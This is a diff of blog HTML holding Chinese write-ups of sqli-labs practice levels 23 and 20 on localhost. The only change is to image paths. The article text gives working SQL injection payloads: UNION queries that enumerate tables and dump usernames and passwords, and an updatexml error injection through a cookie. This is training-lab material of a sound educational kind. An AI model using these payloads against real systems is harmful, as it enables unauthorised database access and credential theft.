@@ -87,8 +87,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23%EF%BC%8C%E8%BE%93%E5%85%A5?id=1">http://127.0.0.1/sql/Less-23，输入?id=1</a> 正常输出。<br>输入’发生报错：</p>
-<p><img src alt="1"><br>查看源代码：</p>
-<p><img src alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’order by 3 and’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png" alt="1"><br>查看源代码：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png" alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’order by 3 and’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
 
       
     </div>
@@ -170,9 +170,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-20/%EF%BC%8C%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-20/，和前两关一样，打开http</a> header live再登陆：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-20/1.png" alt="1"><br>我们可以看到我们的user agent、IP地址、cookie、登录名和密码，由20关的题目可以知道要在cookie里注入。<br>打开hackerbar,把相应的地方先填好:</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-20/2.png" alt="2"><br>在cookie输入’，发生报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-20/3.png" alt="3"><br>再输入#(这里如果用’会没有报错，但有一部分会没有输出,但也是可以用的)，正常输出了，说明可以用’注入（也可以看报错中有<code>&#39;admin&#39;</code>）。<br>可以注入了：<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)#<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)and’<br>，接下来跟前两关差不多了。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/1.png" alt="1"><br>我们可以看到我们的user agent、IP地址、cookie、登录名和密码，由20关的题目可以知道要在cookie里注入。<br>打开hackerbar,把相应的地方先填好:</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/2.png" alt="2"><br>在cookie输入’，发生报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/3.png" alt="3"><br>再输入#(这里如果用’会没有报错，但有一部分会没有输出,但也是可以用的)，正常输出了，说明可以用’注入（也可以看报错中有<code>&#39;admin&#39;</code>）。<br>可以注入了：<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)#<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)and’<br>，接下来跟前两关差不多了。</p>
 <p>ps：cookie也可以登录后再刷新一次，再打开已经打开的http header live，查看：</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/4.png" alt="4"></p>
 
